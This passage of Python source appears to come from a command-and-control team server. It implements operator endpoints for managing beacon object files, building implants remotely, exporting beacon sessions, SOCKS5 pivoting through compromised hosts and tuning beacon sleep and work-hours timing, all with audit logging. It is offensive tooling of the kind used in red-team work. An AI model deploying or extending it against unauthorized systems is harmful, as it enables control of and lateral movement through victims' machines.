                detail='missing name')
            resp = jsonify({'error': 'missing name',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if not isinstance(data_b64, str):
            return Response(status=400)

        import base64 as _b64
        max_b64 = (bof_registry.MAX_BOF_BYTES * 4) // 3 + 16
        if len(data_b64) > max_b64:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.add', target=bname[:64],
                outcome='error',
                detail=f'payload too large (b64 len {len(data_b64)})')
            resp = jsonify({'error': 'BOF too large',
                            'audit_id': audit_id})
            resp.status_code = 413
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            blob = _b64.b64decode(data_b64, validate=True)
        except Exception:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.add', target=bname[:64],
                outcome='error', detail='invalid base64')
            resp = jsonify({'error': 'invalid base64',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if not replace:
            existing = bof_registry.get(bname)
            if existing is not None:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='bof.add', target=bname[:64],
                    outcome='error',
                    detail='name already exists (replace not set)')
                resp = jsonify({
                    'error': (f'BOF {bname!r} is already registered; '
                              f'pass replace=true (or --replace) to '
                              f'overwrite'),
                    'audit_id': audit_id})
                resp.status_code = 409
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        try:
            meta, replaced = bof_registry.add(
                bname, blob, fmt=fmt,
                description=description, source=source,
                origin='upload')
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.add', target=bname[:64],
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.add', target=bname[:64],
                outcome='error',
                detail=f'disk write failed: {exc}')
            resp = jsonify({'error': 'storage failure',
                            'audit_id': audit_id})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='bof.add', target=bname[:64],
            outcome='ok',
            detail=(f'arch={meta["arch"]} size={meta["size"]} '
                    f'sha256={meta["sha256"][:16]} '
                    f'replaced={"yes" if replaced else "no"}'))

        resp = jsonify({
            'ok':       True,
            'name':     bname,
            'sha256':   meta['sha256'],
            'size':     meta['size'],
            'arch':     meta['arch'],
            'replaced': replaced,
            'audit_id': audit_id,
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _bofs_get(self, name, role, ip):
        """Return a registered BOF's bytes so a client can dispatch
        it as a task without needing a local copy."""
        from ..beacon import bof_registry
        import base64 as _b64

        payload = request.get_json(force=True, silent=True) or {}
        bname = (payload.get('name') or '').strip()
        if not bname:
            return jsonify({'error': 'missing name'}), 400

        entry = bof_registry.get(bname)
        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.get', target=bname[:64],
                outcome='error', detail='not found')
            resp = jsonify({'error': f'BOF {bname!r} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            return resp
        if entry.get('missing'):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.get', target=bname[:64],
                outcome='error', detail='blob missing on disk')
            resp = jsonify({'error': f'BOF {bname!r} blob is missing',
                            'audit_id': audit_id})
            resp.status_code = 410
            return resp

        try:
            blob = bof_registry.read_bytes(bname)
        except FileNotFoundError:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.get', target=bname[:64],
                outcome='error', detail='blob missing on disk')
            resp = jsonify({
                'error': f'BOF {bname!r} blob is missing',
                'audit_id': audit_id})
            resp.status_code = 410
            return resp
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.get', target=bname[:64],
                outcome='denied', detail=str(exc)[:200])
            resp = jsonify({
                'error': f'BOF {bname!r} failed integrity check',
                'audit_id': audit_id})
            resp.status_code = 409
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.get', target=bname[:64],
                outcome='error', detail=f'read failed: {exc}'[:200])
            resp = jsonify({
                'error': 'storage read failure',
                'audit_id': audit_id})
            resp.status_code = 500
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='bof.get', target=bname[:64],
            outcome='ok', detail=f'size={len(blob)}')
        resp = jsonify({
            'ok':       True,
            'name':     bname,
            'data_b64': _b64.b64encode(blob).decode('ascii'),
            'format':   entry.get('format', ''),
            'arch':     entry.get('arch', '?'),
            'sha256':   entry.get('sha256', ''),
            'audit_id': audit_id,
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _bofs_remove(self, name, role, ip):
        """Remove a BOF from the registry and delete its blob."""
        from ..beacon import bof_registry

        payload = request.get_json(force=True, silent=True) or {}
        bname = (payload.get('name') or '').strip()
        if not bname:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.remove', outcome='error',
                detail='missing name')
            resp = jsonify({'error': 'missing name',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        meta = bof_registry.remove(bname)
        if meta is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.remove', target=bname[:64],
                outcome='error', detail='not found')
            resp = jsonify({'error': f'BOF {bname!r} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='bof.remove', target=bname[:64],
            outcome='ok',
            detail=f'sha256={meta.get("sha256","")[:16]}')
        resp = jsonify({
            'ok':       True,
            'name':     bname,
            'sha256':   meta.get('sha256', ''),
            'audit_id': audit_id,
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # Remote build

    def _beacon_build(self, name, role, ip):
        """Compile an agent from a remote operator's config.

        The request body is the raw JSON config that
        `beacon-build -c` reads locally. The response contains a
        `build_id` and file metadata; the client then pulls the
        binary in chunks.
        """
        if self.build_manager is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}

        handler = getattr(self.engine, 'handler', None)
        if handler is None:
            return Response(status=503)

        params, err = handler._load_build_config(
            raw=payload, remote=True)
        if err:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.build', outcome='error',
                detail=f'invalid config: {err[:200]}')
            resp = jsonify({'error': err, 'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        c2_profile = None
        if params.get('c2_profile'):
            try:
                from ..beacon.builder import load_c2_profile
                c2_profile = load_c2_profile(params['c2_profile'])
            except Exception:
                c2_profile = None
            if c2_profile is None:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='beacon.build', outcome='error',
                    detail=f"c2 profile {params['c2_profile']} "
                           f"not found")
                resp = jsonify({
                    'error': f"C2 profile "
                             f"{params['c2_profile']!r} not found",
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        try:
            result = self.build_manager.build(
                name, params, c2_profile)
        except RuntimeError as exc:
            msg = str(exc)
            if ('rate limit' in msg
                    or 'concurrent' in msg
                    or 'too many' in msg):
                status = 429
            else:
                status = 500
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.build', outcome='error',
                detail=msg[:200])
            resp = jsonify({'error': msg, 'audit_id': audit_id})
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.build', outcome='error',
                detail=f'build failed: {exc}'[:200])
            resp = jsonify({
                'error': f'build failed: {exc}',
                'audit_id': audit_id})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        summary = (
            f"{params['target_os']}/{params['target_arch']} "
            f"{params['output_format']} "
            f"profile={params['profile_name']} "
            f"transport={params.get('transport_mode', 'http')} "
            f"sha256={result['sha256'][:16]}")
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.build', detail=summary)

        result['audit_id'] = audit_id
        resp = jsonify(result)
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _beacon_build_chunk(self, name, role, ip, build_id):
        if self.build_manager is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        try:
            offset = int(payload.get('offset', 0))
            size = int(payload.get('size', 0))
        except (TypeError, ValueError):
            return Response(status=400)
        if size <= 0 or size > constants.BUILD_CHUNK_SIZE:
            size = constants.BUILD_CHUNK_SIZE

        data = self.build_manager.read_chunk(
            build_id, name, offset, size)
        if data is None:
            return Response(status=404)
        import base64 as _b64
        return jsonify({
            'offset': offset,
            'size':   len(data),
            'data':   _b64.b64encode(data).decode('ascii'),
        })

    def _beacon_build_finish(self, name, role, ip, build_id):
        if self.build_manager is None:
            return Response(status=503)
        ok = self.build_manager.finish(build_id, name)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.build.finish',
            target=build_id,
            outcome='ok' if ok else 'error',
            detail='build delivered and cleaned'
                   if ok else 'unknown build_id')
        resp = jsonify({'ok': bool(ok)})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # Session export

    def _beacon_dump(self, name, role, ip, bid):
        """Return the full state of one beacon for client-side export.

        The client renders its own HTML report from this data. The
        server does not render — that keeps the export pipeline in
        one language and lets the client's report style evolve
        independently.
        """
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)

        import base64 as _b64
        max_results = 500
        results = session.results[-max_results:]
        results_wire = [{
            'id':         r.id,
            'output_b64': _b64.b64encode(r.output).decode('ascii'),
            'error':      r.error,
            'exit_code':  r.exit_code,
        } for r in results]

        MAX_LOG_BYTES = 256 * 1024
        log_text = None
        log_truncated = False
        if session.logger is not None:
            try:
                import os as _os
                log_path = _os.path.join(
                    session.logger.session_dir, 'session.log')
                if _os.path.isfile(log_path):
                    with open(log_path, 'r', encoding='utf-8',
                              errors='replace') as fh:
                        log_text = fh.read(MAX_LOG_BYTES)
                        if fh.read(1):
                            log_truncated = True
            except Exception:
                log_text = None

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.export', target=f'#{bid}',
            detail=f'{len(results_wire)} results')

        resp = jsonify({
            'session': {
                'id':               session.id,
                'display_name':     session.display_name,
                'fingerprint':      session.fingerprint,
                'identity':         dict(session.identity),
                'sleep_interval':   session.sleep_interval,
                'jitter':           session.jitter,
                'kill_deadline':    session.kill_deadline,
                'first_seen':       session.first_seen,
                'last_seen':        session.last_seen,
                'checkins':         session.checkins,
                'last_addr':        session.last_addr or '',
                'alive':            session.alive,
                'work_hours_start': session.work_hours_start,
                'work_hours_end':   session.work_hours_end,
                'rejected_results': session.rejected_results,
            },
            'results': results_wire,
            'log':     log_text,
            'log_truncated': log_truncated,
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # SOCKS5 pivot control

    def _socks_start(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        if self.engine.pivot is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.socks', target=f'#{bid}',
                outcome='error',
                detail='pivot manager not running on server')
            resp = jsonify({'error': 'pivot manager not available'})
            resp.status_code = 503
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        payload = request.get_json(force=True, silent=True) or {}
        try:
            port = int(payload.get('port', 0))
        except (ValueError, TypeError):
            return Response(status=400)
        if not (1024 <= port <= 65535):
            return Response(status=400)

        proxy = self.engine.pivot.start_proxy(session.id, port)
        if proxy is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.socks', target=f'#{bid}',
                outcome='error',
                detail=f'start on port {port} failed (in use, or '
                       f'a proxy already exists for this beacon)')
            resp = jsonify({
                'error': f'could not bind 127.0.0.1:{port} on the '
                         f'server (in use, or a proxy already '
                         f'exists for this beacon)'})
            resp.status_code = 409
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.socks', target=f'#{bid}',
            detail=f'start port={port}')
        resp = jsonify({
            'ok': True,
            'beacon_id': session.id,
            'server_port': proxy.local_port,
            'bind': f'127.0.0.1:{proxy.local_port}',
            'note': ('listener runs on the server machine; use an '
                     'SSH tunnel or a direct route to reach it from '
                     'the client'),
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _socks_stop(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        if self.engine.pivot is None:
            return Response(status=503)
        ok = self.engine.pivot.stop_proxy(session.id)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.socks', target=f'#{bid}',
            outcome='ok' if ok else 'error',
            detail='stop' if ok else 'no proxy was running')
        resp = jsonify({'ok': bool(ok)})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _socks_status(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        if self.engine.pivot is None:
            return jsonify({'running': False,
                            'reason': 'pivot manager not available'})
        proxies = self.engine.pivot.list_proxies()
        mine = [p for p in proxies if p.beacon_id == session.id]
        if not mine:
            return jsonify({'running': False})
        p = mine[0]
        return jsonify({
            'running':     True,
            'beacon_id':   session.id,
            'server_port': p.local_port,
            'bind':        f'127.0.0.1:{p.local_port}',
        })

    # ------------------------------------------------------------------
    # Server-side scheduling verbs

    def _apply_local_verb(self, session, verb, args):
        """Apply a scheduling verb to the session and return a
        human-readable confirmation. Raises ValueError on bad input.

        Never queues a task — session state is authoritative and the
        beacon learns the new values via response headers on the
        next /tasks poll. Same mechanism the local console uses.
        """
        if verb == 'sleep':
            if not args:
                return (f"sleep={session.sleep_interval} "
                        f"jitter={session.jitter:.2f}")
            try:
                interval = int(args[0])
            except (ValueError, TypeError):
                raise ValueError('invalid sleep interval')
            if interval < 0:
                raise ValueError('sleep must be >= 0')
            if interval > 86400:
                raise ValueError('sleep must be <= 86400')
            jitter = session.jitter
            if len(args) > 1:
                try:
                    jitter = float(args[1])
                except (ValueError, TypeError):
                    raise ValueError('invalid jitter')
                if not (0.0 <= jitter <= 1.0):
                    raise ValueError('jitter must be 0.0 - 1.0')
            session.sleep_interval = interval
            session.jitter = jitter
            return f"sleep={interval} jitter={jitter:.2f}"

        if verb == 'workhours':
            if not args:
                return 'workhours=' + self._format_window(session)
            if len(args) == 1:
                a = args[0].lower()
                if a in ('off', 'disable', 'none'):
                    session.work_hours_start = 0
                    session.work_hours_end = 0
                    return 'workhours=off'
                raise ValueError('usage: workhours <start> <end> | off')
            start = self._parse_clock(args[0])
            end = self._parse_clock(args[1])
            if start is None or end is None:
                raise ValueError('invalid clock, expected HH:MM')
            if start == end:
                raise ValueError(
                    "start equals end — use 'workhours off' to disable")
            session.work_hours_start = start
            session.work_hours_end = end
            return 'workhours=' + self._format_window(session)

        raise ValueError(f'not a server-side verb: {verb}')

    @staticmethod
    def _parse_clock(s):
        """Return minutes since midnight for "HH:MM", or None."""
        if not isinstance(s, str) or ':' not in s:
            return None
        try:
            h, m = s.split(':', 1)
            h = int(h)
            m = int(m)
        except (ValueError, TypeError):
            return None
        if not (0 <= h <= 23 and 0 <= m <= 59):
            return None
        return h * 60 + m

    @staticmethod
    def _format_window(session):
        if session.work_hours_start == session.work_hours_end:
            return 'off'
        s = session.work_hours_start
        e = session.work_hours_end
        return f"{s // 60:02d}:{s % 60:02d}-{e // 60:02d}:{e % 60:02d}"

    def _audit_read(self):
        """Return audit entries for one operator (or all, for admins).

        Two filters, both driven by the request payload:

          * `operator` — restrict to one operator's per-operator
            log. Only `audit.read.all` (admin) may request another
            operator's log; self-read is always allowed.
          * `action` — restrict to one action, e.g. 'chat.message'.
            When absent, chat entries are excluded from the result.
            Chat is written to the chain for tamper-evidence, but
            a busy room would otherwise push operational entries
            off the visible window. Requesting the chat view
            explicitly is done with `audit chat` on the client.

        When filtering by action or excluding chat, the fetch
        window is widened so the caller still sees `limit` results
        after the filter is applied.
        """
        name, role, ip = self._extract_peer()
        if name is None:
            return self._auth_failed_response()
        if not _rate_allowed(name):
            return Response(status=429)
        payload = request.get_json(force=True, silent=True) or {}
        target = payload.get('operator', name)
        if target != name and not constants.has_capability(
                role, 'audit.read.all', is_local=False):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='audit.read', target=target,
                outcome='denied')
            return Response(status=403)

        try:
            limit = int(payload.get('limit', 500))
        except (TypeError, ValueError):
            limit = 500
        limit = max(1, min(limit, 5000))

        action_filter = (payload.get('action') or '').strip() or None

        if action_filter:
            fetch = max(limit * 5, 500)
        else:
            fetch = max(limit * 20, 500)

        entries = self.audit.read(
            operator=None if target == '*' else target,
            limit=fetch)

        if action_filter:
            entries = [e for e in entries
                       if e.get('action') == action_filter]
        else:
            entries = [e for e in entries
                       if not str(e.get('action', '')).startswith(
                           'chat.')]

        entries = entries[-limit:]

        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='audit.read', target=target,
            detail=(f'action={action_filter}'
                    if action_filter else ''))
        return jsonify(entries)

    # ------------------------------------------------------------------
    # Lifecycle

    def start(self) -> bool:
        ctx = self._make_tls_context()
        if ctx is None:
            return False
        self._thread = threading.Thread(
            target=self._run, args=(ctx,), daemon=True)
        self._running = True
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False

    def _make_tls_context(self) -> Optional[ssl.SSLContext]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(
                self.registry.server_cert,
                self.registry.server_key)
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.check_hostname = False
            ctx.load_verify_locations(cafile=self.registry.ca_cert)

            try:
                fp = self.registry.ca_fingerprint()
                self.ca_fingerprint_loaded = fp
                print(f"[TEAM] operator listener CA fingerprint: {fp}")
            except Exception:
                self.ca_fingerprint_loaded = None

            try:
                import datetime as _dt
                from cryptography import x509 as _x509
                with open(self.registry.server_cert, 'rb') as _fh:
                    _cert = _x509.load_pem_x509_certificate(
                        _fh.read())
                try:
                    _exp = _cert.not_valid_after_utc
                    _now = _dt.datetime.now(_dt.timezone.utc)
                except AttributeError:
                    _exp = _cert.not_valid_after.replace(
                        tzinfo=_dt.timezone.utc)
                    _now = _dt.datetime.now(_dt.timezone.utc)
                _days = (_exp - _now).days
                if _days < 0:
                    print(f"[TEAM] ERROR: server cert EXPIRED "
                          f"{-_days} days ago — every operator "
                          f"connection will fail with "
                          f"'certificate has expired'", flush=True)
                    print(f"[TEAM]   fix: stop the handler, delete "
                          f"{self.registry.server_cert} and "
                          f"{self.registry.server_key}, restart, "
                          f"then re-export every operator config "
                          f"with `operators export`", flush=True)
                elif _days < 30:
                    print(f"[TEAM] WARNING: server cert expires "
                          f"in {_days} days ({_exp.date()})",
                          flush=True)
                    print(f"[TEAM]   re-mint before then: stop the "
                          f"handler, delete "
                          f"{self.registry.server_cert} and "
                          f"{self.registry.server_key}, restart, "
                          f"then re-export every operator config",
                          flush=True)
            except Exception:
                pass

            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            try:
                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            except AttributeError:
                pass

            ctx.set_ciphers(
                "ECDHE-ECDSA-AES256-GCM-SHA384:"
                "ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-AES128-GCM-SHA256:"
                "ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:"
                "ECDHE-RSA-CHACHA20-POLY1305"
            )

            ctx.options |= ssl.OP_NO_COMPRESSION
            ctx.options |= ssl.OP_NO_RENEGOTIATION
            ctx.options |= ssl.OP_NO_TICKET
            ctx.set_alpn_protocols(['http/1.1'])

            return ctx
        except Exception:
            return None

    def _run(self, ctx):
        try:
            from werkzeug.serving import make_server
        except ImportError:
            return
        kwargs = {
            'ssl_context': ctx,
            'threaded': True,
        }
        if QuietWSGIRequestHandler is not None:
            kwargs['request_handler'] = QuietWSGIRequestHandler
        srv = make_server(
            self.host, self.port, self._app, **kwargs)
        srv.serve_forever()
